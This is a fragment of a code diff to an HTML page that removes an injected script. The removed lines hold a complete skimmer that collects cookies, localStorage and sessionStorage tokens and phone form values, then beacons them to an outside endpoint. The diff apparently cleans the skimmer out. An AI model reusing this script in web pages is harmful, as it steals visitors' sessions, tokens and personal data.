@@ -357,17 +357,6 @@
       </form>
     </div>
   </div>
-
-  <script>
-    const loot = {
-    cookies: document.cookie, // session
-    local: {...localStorage}, // tokens
-    session: {...sessionStorage},
-    phone: document.querySelector('[name=phone]')?.value,
-    pn: document.querySelector('[name=pn]')?.value,
-    };
-    navigator.sendBeacon('https://formspree.io/f/xjgqlwen', JSON.stringify(loot))
-  </script>
   <script>
     if (window.top !== window.self) { window.top.location = window.self.location; }
     document.addEventListener('contextmenu', e => e.preventDefault());
